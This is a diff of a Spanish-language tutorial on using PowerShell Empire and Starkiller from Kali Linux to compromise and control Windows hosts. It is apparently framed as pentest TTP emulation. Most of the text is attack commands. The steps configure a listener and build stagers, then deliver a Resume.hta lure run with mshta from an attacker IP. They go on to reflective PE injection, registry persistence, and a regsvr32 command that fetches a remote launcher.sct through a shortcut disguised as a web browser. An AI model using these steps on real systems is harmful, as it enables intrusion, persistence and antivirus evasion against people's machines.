@@ -1,4 +1,4 @@
-# Powershell Empire: Post-Explotación en redes Windows con Kali linux
+# Powershell Empire: Post-Explotación en redes Windows con Kali linux
 
 -Powershell Empire, es un framework de post-explotación basado en el despliegue de agentes que se ejecutan en las máquinas comprometidas y son gestionados desde una consola bajo el control del pentester.
 -Consiste en la integración de los frameworks conocidos de pentesting con powershell.
@@ -40,10 +40,12 @@ El resultado debe ser el siguiente:
 ## Inicializar Empire
 1. Inicializar servidor empire
 > sudo powershell-empire server
+
 ![image](https://i.imgur.com/SuNG6Of.jpg)
 
 2. Inicializar cliente empire
 > sudo powershell-empire client
+
 ![image](https://i.imgur.com/X2cQsBp.jpg)
 
 ## Instalación Starkiller
@@ -51,6 +53,7 @@ El resultado debe ser el siguiente:
 >cd /opt
 >sudo wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.0.0/starkiller-1.0.0.AppImage
 >sudo chmod +x starkiller-1.0.0.AppImage
+
 ![image](https://i.imgur.com/rFlVBTU.jpg)
 
 ## Inicializar Starkiller (GUI)
@@ -69,6 +72,7 @@ El resultado debe ser el siguiente:
 >BindIP: 10.0.0.187
 >Jitter: 0.5
 >StagingKey: empireadmin
+
 ![image](https://i.imgur.com/uqNHCBy.jpg)
 
 2.Crear Stagers
@@ -98,6 +102,7 @@ Resultado de la creación de Stagers:
 3.Descargar Stagers en /tmp y usarlos con SimpleHTTPServer
 >cd /tmp
 >python -m SimpleHTTPServer 8080
+
 ![image](https://i.imgur.com/JurGJ9P.jpg)
 
 ##Emulación de TTP's
@@ -107,6 +112,7 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 2. Ejecución
 -Ejecutar Resume.hta
 >mshta http://10.0.0.187:8080/Resume.hta
+
 ![image](https://i.imgur.com/lZCeoZq.jpg)
 
 -Migrar a otro proceso con reflective PE Injection
@@ -114,6 +120,7 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 >usemodule code_execution/invoke_reflectivepeinjection
 >set ProcID: <processID>
 >set DllPath: /tmp/launcher.dll
+
 ![image](https://i.imgur.com/Ap8ghR1.jpg)
   
 3. Agente Activo
@@ -124,15 +131,18 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 >usemodule situational_awareness/host/antivirusproduct 
 >usemodule situational_awareness/host/get_uaclevel 
 >usemodule situational_awareness/host/winenum
+
 ![image](https://i.imgur.com/8DjskSO.jpg)
 5. Persistencia
 >usemodule persistence/userland/registry
 >set Listener: http
+
 ![image](https://i.imgur.com/loz2sRu.jpg)
 
 6. Evasión de defensa
 -Ejecución con regsvr32 y scripting. Se crea un acceso directo enmascarango un navegador web con target:
-  C:\Windows\System32\cmd.exe /c "C:\Windows\System32\regsvr32.exe /s /n /u /i:http:\192.168.126.129:8080\launcher.sct scrobj.dll"
+>C:\Windows\System32\cmd.exe /c "C:\Windows\System32\regsvr32.exe /s /n /u /i:http:\192.168.126.129:8080\launcher.sct scrobj.dll"
+
 ![image](https://i.imgur.com/maJN0cy.jpg)
 
 #### De lo presentado anteriormente se puede apreciar que el malware (.exe/dll/hta) permite construir cualquier ataque ya que se tiene acceso a win32.
